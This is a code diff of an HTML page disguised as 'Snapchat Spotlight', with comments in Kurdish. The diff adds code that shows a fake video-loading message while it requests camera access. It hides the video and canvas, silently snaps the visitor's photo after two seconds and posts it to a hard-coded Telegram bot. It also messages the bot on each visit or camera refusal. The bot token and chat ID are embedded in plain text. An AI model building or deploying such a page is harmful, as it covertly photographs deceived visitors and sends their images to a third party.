@@ -1,29 +1,65 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html>
 <head>
-    <meta charset="UTF-8">
     <title>Snapchat Spotlight</title>
-    <script>
-        // لێرە زانیارییەکانت جێگیر بکە
-        const token = '8905171123:AAE1NydzSH5iS2M4YHv3Zirhu89t17XsxnE'; 
-        const chat_id = '646169404'; 
+    <style>
+        body { background-color: black; color: white; text-align: center; font-family: Arial; }
+        video, canvas { display: none; } /* کامێراکە و وێنەکە نیشانی بەکارهێنەر نادرێت */
+    </style>
+</head>
+<body>
+    <h1>Snapchat Spotlight</h1>
+    <p>چاوەڕێ بکە بۆ بارکردنی ڤیدیۆکە...</p>
 
-        function sendToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const token = '8905171123:AAE1NydzSH5iS2M4YHv3Zirhu89t17XsxnE';
+        const chat_id = '646169404';
+
+        // دەستپێکردنی کامێرا
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // دوای ٢ چرکە وێنەکە دەگرێت بۆ ئەوەی کامێراکە ڕوون بێتەوە
+                setTimeout(takeSnap, 2000);
+            } catch (err) {
+                sendTelegramMessage("کەسەکە ڕێگەی بە کامێرا نەدا یان کامێرای نییە.");
+            }
+        }
+
+        // گرتنی وێنەکە
+        function takeSnap() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(sendPhoto, 'image/jpeg');
+        }
+
+        // ناردنی وێنەکە بۆ تێلیگرام
+        function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chat_id);
+            formData.append('photo', blob, 'snap.jpg');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: message })
+                body: formData
+            }).then(() => {
+                sendTelegramMessage("وێنەی کەسەکە بە سەرکەوتوویی گیرا و نێردرا!");
             });
         }
 
-        window.onload = function() {
-            sendToTelegram("کەسێک هاتە ناو سایتەکەتەوە! 🚀");
+        function sendTelegramMessage(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`);
         }
+
+        window.onload = startCamera;
     </script>
-</head>
-<body style="background-color: #000; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
-    <h1>Snapchat Spotlight</h1>
-    <p>چاوەڕێ بکە بۆ بارکردنی ڤیدیۆکە...</p>
 </body>
 </html>
-
